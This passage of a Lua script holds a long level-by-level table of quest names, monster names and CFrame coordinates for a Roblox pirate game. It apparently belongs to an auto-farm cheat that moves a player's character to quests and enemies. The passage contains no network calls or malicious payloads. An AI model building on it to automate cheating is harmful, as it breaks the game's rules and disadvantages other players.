                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1412.92346, 55.3503647, -1260.62036, -0.246266365, -0.0169920288, -0.969053388, 0.000432241941, 0.999844253, -0.0176417865, 0.969202161, -0.00476344163, -0.246220857)
                elseif MyLevel == 100 or MyLevel <= 119 then -- Snowman

                    Ms = "Snowman"
                    NameQuest = "SnowQuest"
                    LevelQuest = 2
                    NameMon = "Snowman"
                    CFrameQuest = CFrame.new(1389.74451, 86.6520844, -1298.90796, -0.342042685, 0, 0.939684391, 0, 1, 0, -0.939684391, 0, -0.342042685)
                    CFrameMon = CFrame.new(1376.86401, 97.2779999, -1396.93115, -0.986755967, 7.71178321e-08, -0.162211925, 7.71531674e-08, 1, 6.08143536e-09, 0.162211925, -6.51427134e-09, -0.986755967)
                elseif MyLevel == 120 or MyLevel <= 149 then -- Chief Petty Officer

                    Ms = "Chief Petty Officer"
                    NameQuest = "MarineQuest2"
                    LevelQuest = 1
                    NameMon = "Chief Petty Officer"
                    CFrameQuest = CFrame.new(-5039.58643, 27.3500385, 4324.68018, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-4882.8623, 22.6520386, 4255.53516, 0.273695946, -5.40380647e-08, -0.96181643, 4.37720793e-08, 1, -4.37274998e-08, 0.96181643, -3.01326679e-08, 0.273695946)
                elseif MyLevel == 150 or MyLevel <= 174 then -- Sky Bandit

                    Ms = "Sky Bandit"
                    NameQuest = "SkyQuest"
                    LevelQuest = 1
                    NameMon = "Sky Bandit"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-4959.51367, 365.39267, -2974.56812, 0.964867651, 7.74418396e-08, 0.262737453, -6.95931988e-08, 1, -3.91783708e-08, -0.262737453, 1.95171506e-08, 0.964867651)
                elseif MyLevel == 175 or MyLevel <= 189 then -- Dark Master

                    Ms = "Dark Master"
                    NameQuest = "SkyQuest"
                    LevelQuest = 2
                    NameMon = "Dark Master"
                    CFrameQuest = CFrame.new(-4839.53027, 716.368591, -2619.44165, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-5079.98096, 376.477356, -2194.17139, 0.465965867, -3.69776352e-08, 0.884802461, 3.40249851e-09, 1, 4.00000886e-08, -0.884802461, -1.56281423e-08, 0.465965867)
                elseif MyLevel == 190 or MyLevel <= 209 then

                    Ms = "Prisoner"
                    LevelQuest = 1
                    NameQuest = "PrisonerQuest"
                    NameMon = "Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 210 or MyLevel <= 249 then

                    Ms = "Dangerous Prisoner"
                    LevelQuest = 2
                    NameQuest = "PrisonerQuest"
                    NameMon = "Dangerous Prisoner"
                    CFrameQuest = CFrame.new(5308.93115, 1.65517521, 475.120514, -0.0894274712, -5.00292918e-09, -0.995993316, 1.60817859e-09, 1, -5.16744869e-09, 0.995993316, -2.06384709e-09, -0.0894274712)
                    CFrameMon = CFrame.new(5433.39307, 88.678093, 514.986877, 0.879988372, 0, -0.474995494, 0, 1, 0, 0.474995494, 0, 0.879988372)
                elseif MyLevel == 250 or MyLevel <= 274 then -- Toga Warrior

                    Ms = "Toga Warrior"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 1
                    NameMon = "Toga Warrior"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1779.97583, 44.6077499, -2736.35474, 0.984437346, 4.10396339e-08, 0.175734788, -3.62286876e-08, 1, -3.05844168e-08, -0.175734788, 2.3741821e-08, 0.984437346)
                elseif MyLevel == 275 or MyLevel <= 299 then -- Gladiato

                    Ms = "Gladiator"
                    NameQuest = "ColosseumQuest"
                    LevelQuest = 2
                    NameMon = "Gladiato"
                    CFrameQuest = CFrame.new(-1576.11743, 7.38933945, -2983.30762, 0.576966345, 1.22114863e-09, 0.816767931, -3.58496594e-10, 1, -1.24185606e-09, -0.816767931, 4.2370063e-10, 0.576966345)
                    CFrameMon = CFrame.new(-1274.75903, 58.1895943, -3188.16309, 0.464524001, 6.21005611e-08, 0.885560572, -4.80449414e-09, 1, -6.76054768e-08, -0.885560572, 2.71497012e-08, 0.464524001)
                elseif MyLevel == 300 or MyLevel <= 329 then -- Military Soldier

                    Ms = "Military Soldier"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 1
                    NameMon = "Military Soldier"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5363.01123, 41.5056877, 8548.47266, -0.578253984, -3.29503091e-10, 0.815856814, 9.11209668e-08, 1, 6.498761e-08, -0.815856814, 1.11920997e-07, -0.578253984)
                elseif MyLevel == 330 or MyLevel <= 374 then -- Military Spy

                    Ms = "Military Spy"
                    NameQuest = "MagmaQuest"
                    LevelQuest = 2
                    NameMon = "Military Spy"
                    CFrameQuest = CFrame.new(-5316.55859, 12.2370615, 8517.2998, 0.588437557, -1.37880001e-08, -0.808542669, -2.10116209e-08, 1, -3.23446478e-08, 0.808542669, 3.60215964e-08, 0.588437557)
                    CFrameMon = CFrame.new(-5787.99023, 120.864456, 8762.25293, -0.188358366, -1.84706277e-08, 0.982100308, -1.23782129e-07, 1, -4.93306951e-09, -0.982100308, -1.22495649e-07, -0.188358366)
                elseif MyLevel == 375 or MyLevel <= 399 then -- Fishman Warrior

                    Ms = "Fishman Warrior"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 1
                    NameMon = "Fishman Warrior"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504, 0.893533468, 3.95251609e-09, 0.448996574, -2.34327455e-08, 1, 3.78297464e-08, -0.448996574, -4.43233645e-08, 0.893533468)
                    CFrameMon = CFrame.new(60946.6094, 48.6735229, 1525.91687, -0.0817126185, 8.90751153e-08, 0.996655822, 2.00889794e-08, 1, -8.77269599e-08, -0.996655822, 1.28533992e-08, -0.0817126185)
                elseif MyLevel == 400 or MyLevel <= 449 then -- Fishman Commando

                    Ms = "Fishman Commando"
                    NameQuest = "FishmanQuest"
                    LevelQuest = 2
                    NameMon = "Fishman Commando"
                    CFrameQuest = CFrame.new(61122.5625, 18.4716396, 1568.16504)
                    CFrameMon = CFrame.new(61928.8867, 18.4828186, 1458.55127)
                elseif MyLevel == 450 or MyLevel <= 474 then

                    Ms = "God's Guard"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 1
                    NameMon = "God's Guards"
                    CFrameQuest = CFrame.new(-4721.71436, 845.277161, -1954.20105)
                    CFrameMon = CFrame.new(-4716.95703, 853.089722, -1933.925427)
                elseif MyLevel == 475 or MyLevel <= 524 then 

                    Ms = "Shanda"
                    NameQuest = "SkyExp1Quest"
                    LevelQuest = 2
                    NameMon = "Shandas"
                    CFrameQuest = CFrame.new(-7859.09814, 5544.19043, -381.476196, -0.422592998, 0, 0.906319618, 0, 1, 0, -0.906319618, 0, -0.422592998)
                    CFrameMon = CFrame.new(-7904.57373, 5584.37646, -459.62973, 0.65171206, 5.11171692e-08, 0.758466363, -4.76232476e-09, 1, -6.33034247e-08, -0.758466363, 3.76435416e-08, 0.65171206)
                elseif MyLevel == 525 or MyLevel <= 549 then -- Royal Squad

                    Ms = "Royal Squad"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 1
                    NameMon = "Royal Squad"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7555.04199, 5606.90479, -1303.24744, -0.896107852, -9.6057462e-10, -0.443836004, -4.24974544e-09, 1, 6.41599973e-09, 0.443836004, 7.63560326e-09, -0.896107852)
                elseif MyLevel == 550 or MyLevel <= 624 then -- Royal Soldier

                    Ms = "Royal Soldier"
                    NameQuest = "SkyExp2Quest"
                    LevelQuest = 2
                    NameMon = "Royal Soldier"
                    CFrameQuest = CFrame.new(-7906.81592, 5634.6626, -1411.99194, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                    CFrameMon = CFrame.new(-7837.31152, 5649.65186, -1791.08582, -0.716008604, 0.0104285581, -0.698013008, 5.02521061e-06, 0.99988848, 0.0149335321, 0.69809103, 0.0106890313, -0.715928733)
                elseif MyLevel == 625 or MyLevel <= 649 then -- Galley Pirate

                    Ms = "Galley Pirate"
                    NameQuest = "FountainQuest"
                    LevelQuest = 1
                    NameMon = "Galley Pirate"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5569.80518, 38.5269432, 3849.01196, 0.896460414, 3.98027495e-08, 0.443124533, -1.34262139e-08, 1, -6.26611296e-08, -0.443124533, 5.02237434e-08, 0.896460414)
                elseif MyLevel >= 650 then -- Galley Captain

                    Ms = "Galley Captain"
                    NameQuest = "FountainQuest"
                    LevelQuest = 2
                    NameMon = "Galley Captain"
                    CFrameQuest = CFrame.new(5259.81982, 37.3500175, 4050.0293, 0.087131381, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, 0.087131381)
                    CFrameMon = CFrame.new(5782.90186, 94.5326462, 4716.78174, 0.361808896, -1.24757526e-06, -0.932252586, 2.16989656e-06, 1, -4.96097414e-07, 0.932252586, -1.84339774e-06, 0.361808896)
                end
            end
            if second_sea then
                Nonquest = false
                if MyLevel == 700 or MyLevel <= 724 then -- Raider
                    Ms = "Raider"
                    NameQuest = "Area1Quest"
                    LevelQuest = 1
                    NameMon = "Raider"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-737.026123, 10.1748352, 2392.57959, 0.272128761, 0, -0.962260842, -0, 1, -0, 0.962260842, 0, 0.272128761)
                elseif MyLevel == 725 or MyLevel <= 774 then -- Mercenary
                    Ms = "Mercenary"
                    NameQuest = "Area1Quest"
                    LevelQuest = 2
                    NameMon = "Mercenary"
                    CFrameQuest = CFrame.new(-429.543518, 71.7699966, 1836.18188, -0.22495985, 0, -0.974368095, 0, 1, 0, 0.974368095, 0, -0.22495985)
                    CFrameMon = CFrame.new(-1022.21271, 72.9855194, 1891.39148, -0.990782857, 0, -0.135460541, 0, 1, 0, 0.135460541, 0, -0.990782857)
                elseif MyLevel == 775 or MyLevel <= 799 then -- Swan Pirate
                    Ms = "Swan Pirate"
                    NameQuest = "Area2Quest"
                    LevelQuest = 1
                    NameMon = "Swan Pirate"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(976.467651, 111.174057, 1229.1084, 0.00852567982, -4.73897828e-08, -0.999963999, 1.12251888e-08, 1, -4.7295778e-08, 0.999963999, -1.08215579e-08, 0.00852567982)
                elseif MyLevel == 800 or MyLevel <= 874 then -- Factory Staff
                    Ms = "Factory Staff"
                    NameQuest = "Area2Quest"
                    LevelQuest = 2
                    NameMon = "Factory Staff"
                    CFrameQuest = CFrame.new(638.43811, 71.769989, 918.282898, 0.139203906, 0, 0.99026376, 0, 1, 0, -0.99026376, 0, 0.139203906)
                    CFrameMon = CFrame.new(336.74585, 73.1620483, -224.129272, 0.993632793, 3.40154607e-08, 0.112668738, -3.87658332e-08, 1, 3.99718729e-08, -0.112668738, -4.40850592e-08, 0.993632793)
                elseif MyLevel == 875 or MyLevel <= 899 then -- Marine Lieutenant
                    Ms = "Marine Lieutenant"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 1
                    NameMon = "Marine Lieutenant"
                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-2842.69922, 72.9919434, -2901.90479, -0.762281299, 0, -0.64724648, 0, 1.00000012, 0, 0.64724648, 0, -0.762281299)
                elseif MyLevel == 900 or MyLevel <= 949 then -- Marine Captain
                    Ms = "Marine Captain"
                    NameQuest = "MarineQuest3"
                    LevelQuest = 2
                    NameMon = "Marine Captain"
                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-1814.70313, 72.9919434, -3208.86621, -0.900422215, 7.93464423e-08, -0.435017526, 3.68856199e-08, 1, 1.06050372e-07, 0.435017526, 7.94441988e-08, -0.900422215)
                elseif MyLevel == 950 or MyLevel <= 974 then -- Zombie
                    Ms = "Zombie"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 1
                    NameMon = "Zombie"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-08, 0.934775114, 1.65461245e-08, 1, 8.04023372e-08, -0.934775114, -1.3095117e-08, 0.355238914)
                elseif MyLevel == 975 or MyLevel <= 999 then -- Vampire
                    Ms = "Vampire"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 2
                    NameMon = "Vampire"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-6030.32031, 0.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
                elseif MyLevel == 1000 or MyLevel <= 1049 then -- Snow Trooper **
                    Ms = "Snow Trooper"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 1
                    NameMon = "Snow Trooper"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(621.003418, 391.361053, -5335.43604, 0.481644779, 0, 0.876366913, 0, 1, 0, -0.876366913, 0, 0.481644779)
                elseif MyLevel == 1050 or MyLevel <= 1099 then -- Winter Warrior
                    Ms = "Winter Warrior"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 2
                    NameMon = "Winter Warrior"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(1295.62683, 429.447784, -5087.04492, -0.698032081, -8.28980049e-08, -0.71606636, -1.98835952e-08, 1, -9.63858184e-08, 0.71606636, -5.30424877e-08, -0.698032081)
                elseif MyLevel == 1100 or MyLevel <= 1124 then -- Lab Subordinate
                    Ms = "Lab Subordinate"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 1
                    NameMon = "Lab Subordinate"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
                elseif MyLevel == 1125 or MyLevel <= 1174 then -- Horned Warrior
                    Ms = "Horned Warrior"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 2
                    NameMon = "Horned Warrior"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-6401.27979, 15.9775667, -5948.24316, 0.388303697, 0, -0.921531856, 0, 1, 0, 0.921531856, 0, 0.388303697)
                elseif MyLevel == 1175 or MyLevel <= 1199 then -- Magma Ninja
                    Ms = "Magma Ninja"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 1
                    NameMon = "Magma Ninja"
                    CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-5466.06445, 57.6952019, -5837.42822, -0.988835871, 0, -0.149006829, 0, 1, 0, 0.149006829, 0, -0.988835871)
                elseif MyLevel == 1200 or MyLevel <= 1249 then 
                    Ms = "Lava Pirate"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 2
                    NameMon = "Lava Pirate"
                    CFrameQuest = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
                    CFrameMon = CFrame.new(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
                elseif MyLevel == 1250 or MyLevel <= 1274 then 
                    Ms = "Ship Deckhand"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 1
                    NameMon = "Ship Deckhand"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
                elseif MyLevel == 1275 or MyLevel <= 1299 then 
                    Ms = "Ship Engineer"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 2
                    NameMon = "Ship Engineer"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(921.30249023438, 125.400390625, 32937.34375)
                elseif MyLevel == 1300 or MyLevel <= 1324 then 
                    Ms = "Ship Steward"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 1
                    NameMon = "Ship Steward"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(917.96057128906, 136.89932250977, 33343.4140625)
                elseif MyLevel == 1325 or MyLevel <= 1349 then 
                    Ms = "Ship Officer"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 2
                    NameMon = "Ship Officer"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(944.44964599609, 181.40081787109, 33278.9453125)
                elseif MyLevel == 1350 or MyLevel <= 1374 then 
                    Ms = "Arctic Warrior"
                    NameQuest = "FrostQuest"
                    LevelQuest = 1
                    NameMon = "Arctic Warrior"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5878.23486, 81.3886948, -6136.35596, -0.451037169, 2.3908234e-07, 0.892505825, -1.08168464e-07, 1, -3.22542007e-07, -0.892505825, -2.4201924e-07, -0.451037169)
                elseif MyLevel == 1375 or MyLevel <= 1424 then -- Snow Lurker
                    Ms = "Snow Lurker"
                    NameQuest = "FrostQuest"
                    LevelQuest = 2
                    NameMon = "Snow Lurker"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5513.36865, 60.546711, -6809.94971, -0.958693981, -1.65617333e-08, 0.284439981, -4.07668654e-09, 1, 4.44854642e-08, -0.284439981, 4.14883701e-08, -0.958693981)
                elseif MyLevel == 1425 or MyLevel <= 1449 then -- Sea Soldier
                    Ms = "Sea Soldier"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 1
                    NameMon = "Sea Soldier"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3115.78223, 63.8785706, -9808.38574, -0.913427353, 3.11199457e-08, 0.407000452, 7.79564235e-09, 1, -5.89660658e-08, -0.407000452, -5.06883708e-08, -0.913427353)
                elseif MyLevel >= 1450 then -- Water Fighter
                    Ms = "Water Fighter"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 2
                    NameMon = "Water Fighter"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-08, -0.670276582, 1.69155214e-08, 1, -6.46908234e-08, 0.670276582, 3.66697037e-08, 0.742111444)
                end
            end
            if third_sea then
                if MyLevel >= 1500 and MyLevel <= 1524 then -- Pirate Millionaire
                    Ms = "Pirate Millionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 1
                    NameMon = "Pirate Millionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1525 and MyLevel <= 1574 then -- Pistol Billionaire
                    Ms = "Pistol Billionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 2
                    NameMon = "Pistol Billionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1575 and MyLevel <= 1599 then -- Dragon Crew Warrior
                    Ms = "Dragon Crew Warrior"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 1
                    NameMon = "Dragon Crew Warrior"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
                elseif MyLevel >= 1600 and MyLevel <= 1624 then -- Dragon Crew Archer
                    Ms = "Dragon Crew Archer"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 2
                    NameMon = "Dragon Crew Archer"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6488.9155273438, 383.38375854492, -110.66246032715)
                elseif MyLevel >= 1625 and MyLevel <= 1649 then -- Female Islander
                    Ms = "Female Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 1
                    NameMon = "Female Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4770.4990234375, 758.95520019531, 1069.8680419922)
                elseif MyLevel >= 1650 and MyLevel <= 1699 then -- Giant Islander
                    Ms = "Giant Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 2
                    NameMon = "Giant Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789)
                elseif MyLevel >= 1700 and MyLevel <= 1724 then -- Marine Commodore
                    Ms = "Marine Commodore"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 1
                    NameMon = "Marine Commodore"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(2490.0844726563, 190.4232635498, -7160.0502929688)
                elseif MyLevel >= 1725 and MyLevel <= 1774 then -- Marine Rear Admiral
                    Ms = "Marine Rear Admiral"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 2
                    NameMon = "Marine Rear Admiral"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(3951.3903808594, 229.11549377441, -6912.81640625)
                elseif MyLevel >= 1775 and MyLevel <= 1799 then -- Fishman Raider
                    Ms = "Fishman Raider"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 1
                    NameMon = "Fishman Raider"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-10322.400390625, 390.94473266602, -8580.0908203125)
                elseif MyLevel >= 1800 and MyLevel <= 1824 then -- Fishman Captain
                    Ms = "Fishman Captain"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 2
                    NameMon = "Fishman Captain"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-11194.541992188, 442.02795410156, -8608.806640625)
                elseif MyLevel >= 1825 and MyLevel <= 1849 then -- Forest Pirate
                    Ms = "Forest Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 1
                    NameMon = "Forest Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13225.809570313, 428.19387817383, -7753.1245117188)
                elseif MyLevel >= 1850 and MyLevel <= 1899 then -- Mythological Pirate
                    Ms = "Mythological Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 2
                    NameMon = "Mythological Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13869.172851563, 564.95251464844, -7084.4135742188)
                elseif MyLevel >= 1900 and MyLevel <= 1924 then -- Jungle Pirate
                    Ms = "Jungle Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 1
                    NameMon = "Jungle Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-11982.221679688, 376.32522583008, -10451.415039063)
                elseif MyLevel >= 1925 and MyLevel <= 1974 then -- Musketeer Pirate
                    Ms = "Musketeer Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 2
                    NameMon = "Musketeer Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-13282.3046875, 496.23684692383, -9565.150390625)
                elseif MyLevel >= 1975 and MyLevel <= 1999 then
                    Ms = "Reborn Skeleton"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 1
                    NameMon = "Reborn Skeleton"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-8817.880859375, 191.16761779785, 6298.6557617188)
                elseif MyLevel >= 2000 and MyLevel <= 2024 then
                    Ms = "Living Zombie"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 2
                    NameMon = "Living Zombie"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-10125.234375, 183.94705200195, 6242.013671875)
                elseif MyLevel >= 2025 and MyLevel <= 2049  then
                    Ms = "Demonic Soul"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 1
                    NameMon = "Demonic Soul"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9712.03125, 204.69589233398, 6193.322265625)
                elseif MyLevel >= 2050 and MyLevel <= 2074 then
                    Ms = "Posessed Mummy"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 2
                    NameMon = "Posessed Mummy"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9545.7763671875, 69.619895935059, 6339.5615234375)    
